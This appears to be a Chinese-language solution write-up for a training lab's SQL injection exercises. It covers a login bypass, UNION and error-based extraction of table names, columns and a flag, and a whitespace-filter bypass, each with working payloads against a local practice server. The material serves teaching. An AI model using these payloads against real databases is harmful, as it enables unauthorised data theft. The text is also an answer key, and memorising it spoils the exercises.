# 题解：sql-injection 模块

> ⚠️ 请先把 4 道题全部做出来，再来看这里！

## si1 万能密码（字符串注入 + 注释符）

```powershell
curl.exe -d "username=admin'#&password=随便填" http://localhost:8083/si1/
```

**讲解**：源码拼接出 `SELECT * FROM users WHERE username='$user' AND password='$pass'`。输入 `admin'#` 后：单引号闭合了 username 的引号，`#` 把后面的 `AND password='...'` 全部注释掉，查询变成 `WHERE username='admin'`——不需要密码。
**考点本质**：字符串注入 = **闭合引号 + 注释掉后面的代码**。`' or '1'='1` 是另一招（恒真条件）。

## si2 UNION 注入（完整流程：表 → 列 → 数据）

**① 探位置**：`0 union select 1,2` —— 页面上出现 1 和 2，说明两个位置都能用

**② 找表**（flag 的表名没有提示，必须自己找）：
```sql
0 union select table_name,2 from information_schema.tables where table_schema=database()
-- 结果里能看到 products 和 secret_table —— 表名找到
```

**③ 找列**：
```sql
0 union select column_name,2 from information_schema.columns where table_schema=database() and table_name='secret_table'
-- 结果：id, data —— 列名找到
```

**④ 取数据**：
```sql
0 union select data,2 from secret_table
```

**讲解**：源码 `SELECT name, price ...` 告诉你 2 列。`id=0` 让前面查不到行。注意 enumeration 一定要加 `table_schema=database()`，否则会列出所有库的表。
**考点本质**：UNION 注入四步——**列数一致 → 位置探针 → information_schema 找表 → 找列 → 提数据**。

## si3 报错注入（完整流程：报错当信道，表 → 列 → 数据）

**① 找表**（用 group_concat 把表名合并成一行报出来）：
```sql
1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)
-- 报错：~products,secret_table
```

**② 找列**：
```sql
1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secret_table')),1)
-- 报错：~id,data
```

**③ 取数据**：
```sql
1 and updatexml(1,concat(0x7e,(select data from secret_table)),1)
-- 报错：~flag{si3_error}
```

**讲解**：updatexml 第三个参数要求合法 XPath，concat 构造非法路径把数据带进报错信息。注意 updatexml 是 **3 个参数**，而 extractvalue 是 **2 个参数**（`extractvalue(1,concat(0x7e,(select data from secret_table)))`），参数个数写错会报 "Incorrect parameter count"。
**考点本质**：报错注入 = **把数据库当"人肉查询器"**，报错信息是唯一出口，表和列都要靠它带出来。
**考点本质**：报错注入 = 让数据库把**查询结果写进报错信息**。0x7e 是 `~`，保证数据出现在报错开头。

## si4 拦 union select（绕过 + 完整流程）

**绕过**：黑名单是 `/\s/`（空白）和 `/union\s+select/i`（连写）。`/**/` 是 MySQL 多行注释，**解析时当作空白**但字面上不是空白字符，正则匹配不到：

```sql
0/**/union/**/select/**/table_name,2/**/from/**/information_schema.tables
0/**/union/**/select/**/column_name,2/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='secret_table'
0/**/union/**/select/**/data,2/**/from/**/secret_table
```

**考点本质**：**过滤是字符串匹配，解析是词法分析**——两者之间的缝隙就是绕过空间。绕过之后仍然是"表 → 列 → 数据"的完整流程。这和命令注入课 ci3 的 ${IFS} 是同一个思想！

## 小结：SQL 注入四件套

1. **字符串注入**：闭合引号 + 注释符（# / -- ）
2. **UNION 注入**：列数一致 + 位置探针 + 提取数据（information_schema）
3. **报错注入**：updatexml / extractvalue 把数据塞进报错
4. **盲注**：布尔（1=1 vs 1=2）/ 时间（sleep）逐字符猜

所有绕过都围绕一个核心：**换一种数据库能理解、而过滤器认不出的写法**。

下一课（XSS）预告：注入目标从"服务器"变成"其他用户的浏览器"。